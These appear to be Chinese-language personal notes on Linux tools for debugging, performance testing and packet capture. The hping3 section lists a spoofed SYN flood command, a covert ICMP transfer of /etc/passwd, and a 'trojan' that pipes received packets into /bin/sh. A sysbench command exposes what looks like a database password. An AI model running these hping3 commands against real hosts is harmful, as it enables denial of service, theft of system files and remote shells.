# 源码和手册
- 源码：
>> 安装了linux了主机上 /usr/src/ 查看uname -ra一致的文件夹  
>> 在线源代码 https://elixir.bootlin.com/linux/latest/source
- 手册： https://www.kernel.org/doc/man-pages/  可以看到用户空间的命令和系统调用等分类
- 手册：https://man7.org/linux/man-pages/man7/network_namespaces.7.html 可以看到网络命名空间解释

# gdb
## 断点的添加、删除、查看
可以根据行号、函数、条件生成断点堆栈的查看。<br>
```
break vswitch_manager_event_handler.c:110
b vswitch_manager_handle_vswitch_connect_success
b vswitch_manager_event_handler.c:115 if vswitch==0
b file.c:func_name
```
查看断点信息：<br>
Info b ,或者info break<br>
删除某个断点：<br>
delete可删除单个断点，也可删除一个断点的集合，这个集合用连续的断点号来描述。<br>
例如：
```
delete 5
delete 1-10
```
停用断点<br>
```
disable 5
enable 5
```
rbreak 可以跟一个规则表达式。rbreak + 表达式的用法与grep + 表达式相似。即在所有与表达式匹配的函数入口都设置断点。 
rbreak list_*
即在所有以 list_ 为开头字符的函数地方都设置断点。
rbreak ^list_
功能与上同。
可以为停止点设定运行命令
 
     commands [bnum]
    ... command-list ...
    end
    为断点号bnum指写一个命令列表。当程序被该断点停住时，gdb会依次运行命令列表中的命令。
    例如： 
        break foo if x>0
        commands
        printf "x is %d/n",x
        continue
        end
    断点设置在函数foo中，断点条件是x>0，如果程序被断住后，也就是，一旦x的值在foo函数中大于0，GDB会自动打印出x的值，并继续运行程序。
### 如果想看程序运行的起点
编译好程序后，暂时不设置断点，gdb进入函数后输入命令info files查看到Entry point，然后设置这个地址为断点即可。例如：
```
(gdb) info files
Symbols from "/opt/sj/test/example".
Local exec file:
        `/opt/sj/test/example', file type elf64-x86-64.
        Entry point: 0x4683e0
        ...
(gdb) b *0x4683e0
Breakpoint 1 at 0x4683e0: file /usr/local/go/src/runtime/rt0_linux_amd64.s, line 8.

```        
 
## 单进程调试
查看堆栈: bt<br>
运行到下一行: n<br>
跳过此断点: c<br>
进入到上个堆栈: up<br>
进入到下个堆栈: down <br>
查看变量: p vswitch<br>
 
查看某个变量的值变化情况,当这个值发生变化时，gdb会自动中断并打印相应的变化信息
```
watch value_name
```
表达式可以是一个地址，如下可以检测4个字节的内存是否变化：
```
watch *(int *)0x12345678
```
表达式可以是一个复杂的语句表达式，例如：
```
watch a*b + c/d
```
watch两个变种 rwatch，awatch，这两个命令只支持硬件观测点如果系统不支持硬件观测点会答应出不支持这两个命令的信息: 
    rwatch <expr>
    当表达式（变量）expr被读时，停住程序。 
    awatch <expr>
    当表达式（变量）的值被读或被写时，停住程序。 
    info watchpoints
    列出当前所设置了的所有观察点。
 
     watch 所设置的断点也可以用控制断点的命令来控制。如 disable、enable、delete等。 
    注意：watch 设置也是断点，如果调试的时候设置的断点（任何种类的断点）过多的时候，watch断点会被忽略，有时候没有任何提示，
            这是我在测试的时候发现的，只有把多余的断点删除后才可用。
 
常用catchpoints来捕获事件，如c++的异常等。捕获点的设置通过catch与tcatch两个命令。
tcatch所设置的断点停止一次后自动删除，设置断点的方法与catch相同。
通过系统函数的名称和系统号，来设置捕获点，当所设定的系统调用时，断点被踩到。常用的系统函数有assert，exec，open等，用法如下，这两个捕获断点一样：
```
catch syscall open
catch syscall 5   
``` 
 
## 多线程调试
发现进程中某个线程死锁后，该进程还是会运行，gdb时ctrl+c中断程序：<br>
a. 死锁了之后info threads 查看是那个线程lock住了<br>
b. thread 5 查看5号线程<br>
c. bt查看该线程的堆栈情况<br>

题外话：线程占有的都是不共享的，其中包括：栈、寄存器、状态、程序计数器；线程间共享的有：堆，全局变量.data区，静态变量.bss区和代码区text。
多协议标签交换，是一种用于快速数据包交换和路由的体系，它为网络数据流量提供了目标、路由地址、转发和交换等能力。更特殊的是，它具有管理各种不同形式通信流的机制。
 
名址分离网络协议，即 Location-ID Separation Protocol.
# valgrind
查看程序运行有无内存泄露: 
```
valgrind ./test
```
1. valgrind --log-file=link.vg --leak-check=full ./cnos
 
2. $ gcc -Wall -o memleak memleak.c (--Wall used to generate all warning info)
$ valgrind --tool=memcheck ./memleak
 
3. $ gcc -Wall -ggdb -o memleak memleak.c
$ valgrind --db-attach=yes --tool=memcheck ./memleak
一出现错误，valgrind会自动启动调试器（一般是gdb）, 退出gdb后我们又能回到valgrind继续执行程序。
 
4. 还是用上面的程序，我们使用callgrind来分析一下它的效率：
```
$ valgrind --tool=callgrind ./memleak
```
Callgrind会输出很多，而且最后在当前目录下生成一个文件： callgrind.out.pid。用callgrind_annotate来查看它：
```
$ callgrind_annotate callgrind.out.3949
```
详细的信息就列出来了。而且，当callgrind运行你的程序时，你还可以使用callgrind_control来观察程序的执行，而且不会干扰它的运行。
 
5. 
```
$ valgrind --tool=cachegrind ./memleak
```
上面的是指令缓存，I1和L2i缓存，的访问信息，包括总的访问次数，丢失次数，丢失率。
中间的是数据缓存，D1和L2d缓存，的访问的相关信息，下面的L2缓存单独的信息。Cachegrind也生成一个文件，名为cachegrind.out.pid，可以通过cg_annotate来读取。输出是一个更详细的列表。Massif的使用和cachegrind类似，不过它也会生成一个名为massif.pid.ps的PostScript文件，里面只有一幅描述堆栈使用状况的彩图。
以上只是简单的演示了valgrind的使用，更多的信息可以在它附带的文档中得到，也可以访问valgrind的主页：http://www.valgrind.org。学会正确合理地使用valgrind对于调试程序会有很大的帮助。
6. 
```
$ valgrind –tool=massif python test.py
```
Massif能够检测系统中的内润占用情况。我们将代码保持成test.py,执行上述命令后会生成一个massif.out.xxx的文件，然后可以用ms_print命令。
```
$ms_print massif.out.12076 > profile.txt
```
再打开profile.txt文件，可以看到程序在启动中大概占用了多少的内存容量，通过图标可以直观的看到内存的数据增长，并且能够有效的理解内存上的分配数据。
# strace
非Linux自带程序，需要安装。
用strace命令可能会更方便一点。它可以显示各个系统调用/信号的执行过程和结果。比如文件打开出错，一眼就看出来了，连错误的原因(errno)都知道.
# splint
splint功能：程序静态分析工具
常识性测试并产生一些警告信息。它可以检测未经赋值的变量使用，函数的参数未使用等异常情况。

# ifconfig
- ifconfig #显示的是所有up的端口
- ifconfig -a #显示多有端口，包括down的端口
### eth0上添加一个IP地址，并带起来
ifconfig eth0:0 172.100.100.200 netmask 255.255.255.0 broadcast 172.100.100.255 up

### 删除一个eth0上的地址
ifconfig eth0:0 172.100.100.200 netmask 255.255.255.0 broadcast 172.100.100.255 down
 
# tcpdump
tcpdump 是BPF最著名的用户之一，用户可以定义一个包过滤表达式。只有匹配该表达式的数据包才会被捕获。如下所示，这个表达式可以被编译器简化为BPF字节码。  
$sudo tcpdump -d "tcp dst port 80"  

$tcpdump -w file.name –i any  查看所有端口的包并输出到文件file.name中<br>
$tcpdump host sundown      打印所有进入或离开sundown的数据包
 或者tcpdump host 210.27.48.1<br>
$tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \)
截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信<br>
$tcpdump -i eth0 src host hostname 截获主机hostname发送的所有数据v
$tcpdump -i eth0 port 6653 截获主机interface eth0, 6653端口发送的所有数据<br>
$tcpdump -i eth0 port 6653 or 8080 截获主机interface eth0, 6653或者8080端口发送的所有数据<br>
-n关闭地址转换（比如 IP 地址转换为主机名，port 80 转换为 http），如果没有这个参数的话抓包会比较慢<br>
-e Print the link-level header on each dump line.<br>
如果即时显示报文可以命令：tcpdump –eni eth0<br>
 
$tcpdump icmp -eni any 截获所有端口的ICMP协议的包，并实时打印到屏幕如下图.<br>
第一列为时间戳<br>
第二列为包的方向，P为发出即Push, Out为收<br>
第三列为srcmac<br>
第四列为二层包类型<br>
第五列为包总长度（bytes）<br>
第六列为srcipàdstip<br>
第七列为报文内容描述<br>
第八列为事物ID<br>
第九列为seq<br>
第十列为报文内容，ICMP报文头加ICMP报文Data的长度<br>
  
$tcpdump -eni eth0 -X  // -X 用于以 ASCII 码来展示 TCP 里面的数据  
$tcpdump -w file.pcap 'dst port 443 && tcp[20]==22 && tcp[25]==1'  
tcp[20]==22：这是提取了 TCP 的第 21 个字节（因为初始序号是从 0 开始的），由于 TCP 头部占 20 字节，TLS 又是 TCP 的载荷，那么 TLS 的第 1 个字节就是 TCP 的第 21 个字节，也就是 TCP[20]，这个位置的值如果是 22（十进制），那么就表明这个是 TLS 握手报文。tcp[25]==1：同理，这是 TCP 头部的第 26 个字节，如果它等于 1，那么就表明这个是 Client Hello 类型的 TLS 握手报文。  
$tcpdump -w file.pcap 'tcp[tcpflags]&(tcp-rst) != 0' //滤出 TCP RST 报文, 这是tcpdump预定义了一些相对方便的过滤器的其中一种  
$tcpdump -r file.pcap 'tcp[tcpflags] & (tcp-rst) != 0' -w rst.pcap // 读取已抓取的file.pcap报文内容，并过滤重新保存到文件rst.pcap中  
$抓包文件中任何一个客户端报文（也就是源端口为高端口）的 TTL，如果它是 64、128 或 255，那说明这个抓包文件就是在客户端做的。反之，就是在服务端做的。  

## wireshark 解析指定协议，这里以vxlan协议为例
- 查看enabled protocol,确保vxlan protocol处于enabled状态. Analyze ->Enabled Protocols->Vxlan
- 调整Wireshark配置，让8472端口的数据包解析为vxlan协议.
  选中 udp 端口8472 的数据包 -> decode as -> UDP (destination 8472)  decode as -> VXLAN
  或者    选中 udp 端口8472 的数据包 ->  (菜单栏) Analyze->Decode as -> UDP (destination 8472)  decode as -> VXLAN

# ps
- 查看所有进程： ps –A
- 查看所有进程，使用标准语法：ps -ef
- 查看所有进程，使用BSD语法： ps aux
- 查看进程的端口号：ps –ef|grep program-name
- 查看整条命令：ps -auxwww | grep 进程号
- 查看指定进程：ps -p pid
- 查看指定参数：ps -L -p 821 -o tid,pid,cpuid,ppid,args
- 查看进程打开的所有文件： lsof –p 进程号
- 查看线程属于哪个CPU： ps –eLo psr
- 其中L是线程，o指明format, psr 是processor that process is currently assigned to.
- 查看第五个参数psr为2的线程的所有参数：
ps -eLo ruser,pid,ppid,lwp,psr,args | awk ‘{if($5==2) print $0}’
- 查看进程下的线程：`ps -T -p <pid>`
- 查看进程13452的进程树，结果中{}表示线程： pstree -aps 13452

# top
常用的进程和资源消耗查询工具，可以查看开机时间、平均负载、进程线程的资源消耗等  
对于 top 命令来说，它只能显示整个节点中各项 CPU 的使用率，不能显示单个容器的各项 CPU 的使用率, 从每个容器的 CPU Cgroup 控制组里的 cpuacct.stat 的统计值中，可以比较快地得到整个容器的 CPU 使用率.
## 平均负载
显示的第一行后半部分 ```load average: 0.02, 0.01, 0.01```表示CPU平均负载，三个数字依次则是过去 1 分钟、5 分钟、15 分钟的平均负载。参考本文档CPU平均负载的阐述。
## CPU占用比例
第三行"%Cpu(s)"开头的这一行，你会看到一串数值，也就是"0.0 us, 0.0 sy, 0.0 ni, 99.9 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st"
 - us是"user"的缩写，代表 Linux 的用户态 CPU Usage。普通用户程序代码中，只要不是调用系统调用（System Call），这些代码的指令消耗的 CPU 就都属于"us"。
 - sy是 "system"的缩写，代表内核态 CPU 使用。例如系统调用read等操作
 - wa是"iowait"的缩写，代表等待 I/O 的时间，这里的 I/O 是指 Disk I/O.例如上述read系统调用会向 Linux 的 Block Layer 发出一个 I/O Request，触发一个真正的磁盘读取操作。这时候，这个进程一般会被置为 TASK_UNINTERRUPTIBLE。而 Linux 会把这段时间标示成"wa"
 - hi是"hardware irq"的缩写，代表 CPU 处理硬中断的开销。由于我们的中断服务处理需要关闭中断，所以这个硬中断的时间不能太长。例如，机器在网络收到一个网络数据包，网卡就会发出一个中断（interrupt）。相应地，CPU 会响应中断，然后进入中断服务程序。
 - si是"softirq"的缩写，代表 CPU 处理软中断的开销。发生中断后的工作是必须要完成的，如果这些工作比较耗时那怎么办呢？Linux 中有一个软中断的概念（softirq），它可以完成这些耗时比较长的工作。大部分中断都是软中断。
 - ni是"nice"的缩写，这里表示如果进程的 nice 值是正值（1-19），代表优先级比较低的进程运行时所占用的 CPU。
 - st是"steal"的缩写，是在虚拟机里用的一个 CPU 使用类型，表示有多少时间是被同一个宿主机上的其他虚拟机抢走的。  
 top命令通过读取进程的 /proc/[pid]/stat 文件来计算单个进程的CPU占用比例，计算公式：`进程的 CPU 使用率 =((utime_2 – utime_1) + (stime_2 – stime_1)) * 100.0 / (HZ * et * 1 )`  
 top命令通过读取文件/proc/stat来计算整个系统的 CPU 使用率，可以通过man proc知道前 8 列数据正好对应 top 输出中"%Cpu(s)"那一行里的 8 项数据

 ## 输出字段含义
 -RES Resident Set Size 的缩写（RSS），简单来说它就是指进程真正申请到物理页面的内存大小。
  >- 应用程序在申请内存的时候，比如说，调用 malloc() 来申请 100MB 的内存大小，malloc() 返回成功了，这时候系统其实只是把 100MB 的虚拟地址空间分配给了进程，但是并没有把实际的物理内存页面分配给进程。上一讲中，我给你讲过，当进程对这块内存地址开始做真正读写操作的时候，系统才会把实际需要的物理内存分配给进程。而这个过程中，进程真正得到的物理内存，就是这个 RSS 了。
 -VIRT 虚拟地址空间大小,对应上面的实际的物理内存。

## 进程状态
 - 输入top命令后的 S 列（也就是 Status 列）表示进程的状态： R、D、Z、S、I 等几个状态
   - R   是 Running 或 Runnable 的缩写，表示进程在 CPU 的就绪队列中，正在运行或者正在等待运行。
   - D   是 Disk Sleep 的缩写，也就是不可中断状态睡眠（Uninterruptible Sleep），一般表示进程正在跟硬件交互，并且交互过程不允许被其他进程或中断打断。进程处于D状态一般情况下很短暂，不应该被top或者ps看到。如果进程在top和ps看到长期处于D状态，那么可能进程在等待IO时出现了问题导致进程一直等待不到IO资源 此时如果要处理掉这个D进程，那么只能重启整个系统才会恢复。因为此时整个进程无法被kill 掉。
   - S   是 Interruptible Sleep 的缩写，也就是可中断状态睡眠，表示进程因为等待某个事件而被系统挂起。当进程等待的事件发生时，它会被唤醒并进入 R 状态。
   - Z   是 Zombie 的缩写，如果你玩过“植物大战僵尸”这款游戏，应该知道它的意思。它表示僵尸进程，也就是进程实际上已经结束了，但是父进程还没有回收它的资源（比如进程的描述符、PID 等）。
   - I   是 Idle 的缩写，也就是空闲状态，用在不可中断睡眠的内核线程上。前面说了，硬件交互导致的不可中断进程用 D 表示，但对某些内核线程来说，它们有可能实际上并没有任何负载，用 Idle 正是为了区分这种情况。要注意，D 状态的进程会导致平均负载升高， I 状态的进程却不会。
   - T   或者 t，也就是 Stopped 或 Traced 的缩写，表示进程处于暂停或者跟踪状态。
   - X   也就是 Dead 的缩写，表示进程已经消亡，所以你不会在 top 或者 ps 命令中看到它。

## top 查看进程
1. 查看启动时间：Top 可以查看uptime的信息，在最前面几行

2. 查看指定进程：
–p process_id //单独显示某个进程的动态信息

## top 查看线程
-H           //查看所有子进程的动态信息，可以看到子进程数   

# CPU
查看CPU信息： cat /proc/cpuinfo
               /sys/devices/system/cpu/<br>
 - 物理核数: grep 'physical id' /proc/cpuinfo|sort|uniq|wc -l 
 - 逻辑核数: cat /proc/cpuinfo| grep -i "processor"|wc -l
 
taskset -p [mask] pid 。<br>
其中，mask是一个代表了处理器亲和性的掩码数字，转化为二进制表示后，它的值从最低位到最高位分别代表了第一个逻辑CPU到最后一个逻辑CPU，进程调度器可能将该进程调度到所有标为“1”的位代表的CPU上去运行。根据上面的输出，taskset运行之前，QEMU线程的处理器亲和性mask值是0x3（其二进制值为：0011），可知其可能会被调度到cpu0和cpu1上运行；而运行“taskset -p 0x4 3967”命令后，提示新的mask值被设为0x4（其二进制值为：0100），所以该进程就只能被调度到cpu2上去运行，即通过taskset工具实现了vCPU进程绑定到特定的CPU上。<br>
 
"grep -c 'model name' /proc/cpuinfo"命令，直接返回CPU的总核数<br>
CPU负载用uptime, 或者w命令和top命令也行<br>
查看CPU使用率mpstat -P ALL 2<br>
(以上命令中的2是间隔2秒显示一次的意思，也可以为1,3…)

## 平均负载
平均负载是指单位时间内，系统处于可运行状态和不可中断状态的平均进程数，也就是平均活跃进程数，它和 CPU 使用率并没有直接关系。`Load Average= 可运行队列进程平均数 + 休眠队列中不可打断的进程平均数`,这也是为什么有时候平均负载会高于CPU使用率。因为我们常用的系统CPU使用率不计算D状态进程。
这里我先解释下，可运行状态和不可中断状态这俩词儿。所谓可运行状态的进程，是指正在使用 CPU 或者正在等待 CPU 的进程，也就是我们常用 ps 命令看到的，处于 R 状态（Running 或 Runnable）的进程。平均活跃进程数，直观上的理解就是单位时间内的活跃进程数，但它实际上是活跃进程数的指数衰减平均值(被消耗掉的cpu个数)。这个“指数衰减平均”的详细含义你不用计较，这只是系统的一种更快速的计算方式，你把它直接当成活跃进程数的平均值也没问题。一般平均负载超过70%就需要留心了。
比如当平均负载为 2 时，意味着什么呢？
 - 在只有 2 个 CPU 的系统上，意味着所有的 CPU 都刚好被完全占用。
 - 在 4 个 CPU 的系统上，意味着 CPU 有 50% 的空闲。
 - 而在只有 1 个 CPU 的系统中，则意味着有一半的进程竞争不到 CPU。

 ### 平均负载和CPU消耗的关系
 当没有D状态的进程时，平均负载等于CPU消耗；但是当有D状态进程时，平均负载要高于CPU Usage. 可以通过`ps aux|grep "D"` 来查看D状态进程。

 ## 性能指标工具
  详见同目录下的图《cpu性能分析工具》

 ## TLB
 TLB（Translation Lookaside Buffer，转译后备缓冲器） 其实就是 MMU 中页表的高速缓存， MMU是存储在 CPU 的内存管理单元。


# 模块操作
- lsmod|grep xxx 查看是否已安装xxx模块， 或者 ls /lib/modules/$(uname -r)/kernel/net/sched | grep netem 
- modprobe xxx 安装xxx模块
- yum install kernel-modules-extra centos安装扩展模块
> 注意安装模块时，模块的版本要和系统版本一致，否则无用。可以用hostnamectl查看系统信息，然后 ```yum install module-version```来指定版本安装
 
# pktgen

# netstat
$netstat -apn|grep 8000 查看所有端口号为8000的程序连接
会输出：
然后再输入ps 40865就可以查看到该进程的详细信息<br>
 
$netstat –au列出所有udp端口<br>
$netstat –at 列出所有tcp端口<br>
$netstat -ant 获取当前的 TCP、UDP 等的连接信息<br>
$netstat –l  显示监听端口<br>
$ netstat –tulnp<br>
$netstat -ntu | tail -n +3 | awk '{print $5}' | sort | uniq -c | sort -nr <br>
通过 netstat 的信息，把与本地相关的各种状态的 IP 都计数，排序列出来。  
$netstat -s 可以看到协议的收发汇总，以及错误信息  
$netstat -i 查看有没有丢包  
$watch --diff netstat -s 查看变化
$ netstat -r //查看路由  
# nc
传输层工具
nc 也叫 ncat 是netcat 的缩写, 但在ubuntu中没有ncat. 用 `yum install nmap-ncat -y` 安装
在一个终端中敲命令  
$nc -ul 127.0.0.0 9997 开启一个UDP server, 监听9997端口  
再同主机的另一个终端中敲命令
$nc -u 127.0.0.0 9997   
test  
// test字符就传送到了第一个server中

$nc -w 2 -zv www.baidu.com 443 //和telnet功能类似  



# ss
ss is used to dump socket statistics.
```
ss -lnt   查看正在监听的端口
ss -l 显示本地打开的所有端口
ss -n 显示数字地址和端口(而不是名字)
ss -pl 显示每个进程具体打开的socket
ss -t -a 显示所有tcp socket
ss -u -a 显示所有的UDP Socekt
ss -o state established '( dport = :smtp or sport = :smtp )' 显示所有已建立的SMTP连接
ss -o state established '( dport = :http or sport = :http )' 显示所有已建立的HTTP连接
ss -x src /tmp/.X11-unix/* 找出所有连接X服务器的进程
ss -s 列出当前socket详细信息
```

# traceroute
```
traceroute www.baidu.com -I //  -I 参数（I 代表 ICMP）  

 mtr www.baidu.com -r -c 10 // mtr 还能实现丰富的探测报告。尤其是它对每一跳的丢包率的百分比  
```

# hping3
hping3是一款免费的数据包生成器和分析器。可用于安全审计、防火墙规则测试、网络测试、端口扫描、性能测试，压力测试(DOS)，几乎可以发送任意类型的TCP/IP数据包。功能强大但是每次只能向一个IP地址发送数据包，还能够在两个相互包含的通道之间传送文件。
 - ping服务：hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
 - 数据包跟踪：hping3 –traceroute -V -1 www.baidu.com（类似于traceroute www.baidu.com）
 - 端口扫描：hping3 -I eth0  -S 192.168.10.1 -p 80
            hping3 -8 1-1024 192.168.100.102
 - 拒绝服务攻击：对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。此外还能进行Sync flood攻击、TCP flood攻击、ICMP flood攻击、UDP flood攻击等多种DOS攻击.
    hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
 - 文件传输：在接收端开启服务：hping3 192.168.1.159--listen signature --safe  --icmp  
            在发送端使用签名打包的ICMP包发送文件：hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
 - 木马功能：在木马启动端：hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh  
            在远程控制端：
            `echo ls >test.cmd
            hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd`

 
# wireshark
### 过滤源ip、目的ip
在wireshark的过滤规则框Filter中输入过滤条件。如查找目的地址为192.168.101.8的包，ip.dst==192.168.101.8；查找源地址为ip.src==1.1.1.1；
### 查找源地址或者目的地址为8.8.8.8的报文：
Ip.addr==8.8.8.8
端口过滤。如过滤80端口，在Filter中输入，tcp.port==80，这条规则是把源端口和目的端口为80的都过滤出来。使用tcp.dstport==80只过滤目的端口为80的，tcp.srcport==80只过滤源端口为80的包；
协议过滤比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议；
### http模式过滤
如过滤get包，http.request.method=="GET",过滤post包，http.request.method=="POST"；<br>
连接符and的使用。过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src==192.168.101.8 and http。<br>
# nmap
# netperf
传输层工具  
 Netperf是一种网络性能的测量工具，主要针对基于TCP或UDP的传输。主要用来测试吞吐量。Netperf工具以client/server方式工作。server端是netserver，用来侦听来自client端的连接，client端是netperf，用来向server发起网络测试。测试过程中，在服务器上运行serverperf，同时在客户端上运行netperf。Netperf和netserver都是可执行脚本。
## 安装方法
```
yum clean all
yum makecache
yum -y update
yum install -y iptraf
wget ftp://ftp.netperf.org/netperf/netperf-2.7.0.tar.gz
(如果别的地方有netperf和netserver两个脚本可以直接拷贝过来使用)
./configure
make
make install
```   
## 一般运行方法
使用：直接运行脚本，如下连接192.168.5.2上的netserver,持续50秒，统计结果将在50秒后显示. 要求在192.168.5.2上开启
```
./netserver &
./netperf –H 192.168.5.2 –l 50
``` 
 -r：设置request和response分组的大小<br>
 TCP_RR: 在一个TCP连接中进行多次TCP request和response的交易过程，这种模式常常出现在数据库应用中。
 ```
./netperf  -H 10.8.65.20 -l 10 -t TCP_RR -- -r 64,64
[root@ywl]# ./netperf  -H 10.8.65.20 -l 10 -t TCP_RR -- -r 64,64
MIGRATED TCP REQUEST/RESPONSE TEST from 0.0.0.0 (0.0.0.0) port 0 AF_INET to 10.8.65.20 () port 0 AF_INET : first burst 0
Local /Remote
Socket Size   Request  Resp.   Elapsed  Trans.
Send   Recv   Size     Size    Time     Rate        
bytes  Bytes  bytes    bytes   secs.    per sec  
 
16384  87380  64       64      10.00    2029.14  
16384  87380
```
Netperf
输出的结果也是由两行组成。第一行显示本地系统的情况，第二行显示的是远端系统的信息。平均的交易率（transaction rate）为2029.14次/秒。
 
 ```
-o send,recv      Set the local send,recv buffer offsets
-O send,recv      Set the remote send,recv buffer offset
-c [cpu_rate]     Report local CPU usage
-C [cpu_rate]     Report remote CPU usage
```
## TCP测试方法
TCP_CRR: 每次交易建立一个TCP连接，典型的应用是HTTP
```
./netperf -t TCP_CRR -o 300 -O 300 -C -c -l 60 -H 192.168.191.10 
```
测试TCP短连接传输速率（即打小包）
 
 
-m：设置本地系统发送测试分组的大小
-M：设置远端系统接收测试分组的大小
TCP_STREAM: （即默认测试方式）TCP批量传输，在测试过程中，netperf向netserver发送批量的TCP数据分组，以确定数据传输过程中的吞吐量<br>
netperf -t TCP_STREAM -H 192.168.0.1 -l 60 -- -m 2048
 
 
## UDP测试方法
./netperf –t UDP_STREAM –H 183.2.172.247 –l 300 -- -R 1 –m 1024
注意时间参数往前放，放到后面不生效
 
-R 0/1            Allow routing of traffic on data connection.
                Default: 0 (off) for UDP_STREAM, 1 (on) otherwise
如果每秒的包交换数没有达到预期，可以通过
（1）调整内核参数来提高网络性能以下参数是官方给出的一个配置，通过
```
sysctl –a查看，sysctl –w修改参数：
net.ipv4.ip_local_port_range = 1024 65536  
net.core.rmem_max=16777216 
net.core.wmem_max=16777216 
net.ipv4.tcp_rmem=4096 87380 16777216  
net.ipv4.tcp_wmem=4096 65536 16777216  
net.ipv4.tcp_fin_timeout = 30 
net.core.netdev_max_backlog = 30000 
net.ipv4.tcp_no_metrics_save=1 
net.core.somaxconn = 262144 
net.ipv4.tcp_syncookies = 1 
net.ipv4.tcp_max_orphans = 262144 
net.ipv4.tcp_max_syn_backlog = 262144 
net.ipv4.tcp_synack_retries = 2 
net.ipv4.tcp_syn_retries = 2 
```
（2）dmesg查看linux内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM等多个运行级别的大量的系统信息
# AB
应用层工具  
安装 yum install httpd-tools
ab是http压测工具，默认发起的是http1.0连接，但应答可能是http1.1或者http2.0
### Get某个文件
./ab -n 2000000 -c 20 http://10.189.255.119:12345/40x.html
 
### GET请求
./ab -n400 -c100
-H "Content-Type:application/json" -H "User-Agent: 11223344"  -H "X-Auth-Token: 55667788"   http://10.8.64.179:8082/ippool
 
### 带body的POST请求
ab -n 1 -v 4 -p ipbody.txt -T application/json -H "User-Agent: 11223344"  -H "X-Auth-Token: 55667788"   http://10.8.64.179:8082/ipam/autoassign
 
ipbody.txt 中的内容:
 {"apiVersion": "v1", "kind": "ipam", "handleid": "test111", "hostname": "test-host", "ipv4pools": ["172.24.0.0/16"], "num4": 1,}
# iperf
64位centos安装方法：
到https://iperf.fr/iperf-download.php下载 找到CentOS 64 bits的rpm包进行安装(rpm -ivh rpm包文件)
在CentOS 7上使用下列命令即可安装：
# yum install iperf3
和netperf类似，用法

```
// TCP包
iperf -c 172.27.36.100 -t 20
// 8个线程
iperf -c 172.27.36.100 -t 20 -P 8
// UDP包
iperf3 -u -c 172.27.36.100 -b 900m -i 1 -t 120
//绑定本地网卡地址指定client端口，server端不需要做特殊配置.测试感觉不管用，还有别的端口
iperf3 -c 172.18.8.129  --cport 5201 --bind 172.18.8.130 
```
其中172.27.36.100是server端地址; -u 打UDP包，打流带宽为900m, -i为显示报告间隔

# wrk
应用层工具  
wrk是高性能http压测工具(如果github打不开，可用码云https://gitee.com/mirrors/wrk)
## 安装wrk
```
git clone https://github.com/wg/wrk.git wrk
cd wrk
make
# 将可执行文件移动到 /usr/local/bin 位置
sudo cp wrk /usr/local/bin
172.18.8.130 上有x86版本
172.18.8.44  上有arm版本
```

## 运行wrk
```
// 对 www.baidu.com 发起压力测试，线程数为 12，模拟 400 个并发请求，持续 30 秒
wrk -t12 -c400 -d30s http://www.baidu.com 
```


如果万兆网卡达不到万兆，就要看看网线、交换机是不是都是万兆的。CAT6是千兆线，CAT6A以上的线才是万兆线。
```
10000baseT/Full    电口
1000baseX/Full     光口
10000baseSR/Full   SR(short range)
10000baseLR/Full   LR(long range)
```

## 压测思路
在CPU、网卡中选一个可以打满的，看另一个的负载指标
 - 通过绑定wrk端核数，修改server端的核数、timeout时间等尽量提供带宽，减少断链来打满CPU看pps, 或者打满CPU看带宽
 - 通过绑定wrk端核数，修改server端的核数、timeout时间等尽量提供带宽，减少断链来打满网卡看pps, 或者打满网卡看CPU负载

# Sysbench
性能测试工具
下载sysbench: git clone https://github.com/akopytov/sysbench.git
```
./autogen.sh #需要安装libtool
./configure --with-mysql-includes=/usr/local/mysql/include --with-mysql-libs=/usr/local/mysql/lib
make && make install
5.0更换了测试模式，使用脚本进行测试，因此--test后面要填写脚本的目录
使用：
/root/sysbench-0.4.12-1.1/sysbench/tests/db/oltp.lua
 
sysbench --test=oltp --mysql-table-engine=innodb --oltp-table-size=1000000 --mysql-user=neutron --mysql-password=f6428915807f4b36 --mysql-host=10.8.65.109 --mysql-port=3306 --num-threads=80  --db-driver=mysql --mysql-db=test prepare
 
sysbench --test='oltp.lua' --mysql-table-engine=innodb --oltp-table-size=1000000 --mysql-user=neutron --mysql-password=123456 --mysql-host=172.16.118.134 --mysql-port=3306 --num-threads=80  --db-driver=mysql run
sysbench --test='oltp.lua' --mysql-table-engine=innodb --init-rng=on --max-time=43200 --oltp-table-size=100000 --max-requests=0 --oltp-read-only=off --mysql-user=root --mysql-password=123456 --mysql-host=172.16.118.134 --mysql-port=3306 --num-threads=200 --db-driver=mysql --mysql-db=test run
 
sysbench --test='oltp.lua' --mysql-table-engine=innodb --oltp-table-size=1000000 --mysql-user=neutron --mysql-password=123456 --mysql-host=172.16.118.134 --mysql-port=3306 --num-threads=80  --db-driver=mysql --mysql-db=test clean
```

# stress
stress 是一个 Linux 系统压力测试工具，这里我们用作异常进程模拟平均负载升高的场景。
```
// 在第一个终端运行 stress 命令，模拟一个 CPU 使用率 100% 的场景
$ stress --cpu 1 --timeout 600
```

# Ifstat 网络流量统计工具 
Ifstat: 查看所有网络接口的流量信息<br>
查看全部流量sar -n DEV 2 (安装方法  yum install sysstat -y)<br>
查看CPU使用率mpstat -P ALL 2<br>
(以上两个命令中的2是间隔2秒显示一次的意思，也可以为1,3…) 
ethtool -i eth0 查看网卡eth0网速信息包括网速，双工否，链路模式（百兆、千兆）
 
# 网速调优方法：
1. 用高性能物理机代替虚拟机
2. 调节ethernet mtu 为1500
 如果流量忽高忽低，可能是net.ipv4.tcp_sack 选项关闭了，导致等待回应，滑动窗口卡主了。
 路由器不能转发包，可能是net.ipv4.conf.all.forwarding没有打开
Ip link set dev eth0 mtu 1500
查看mtu：cat /sys/class/net/eth0/mtu

# Ethtool
ethtool eth0 查看网卡eth0的基本信息<br>
ethtool –T eth0 Show time stamping capabilities, 是否支持PTP等<br>
查看全部网卡信息：cat /proc/net/dev<br>
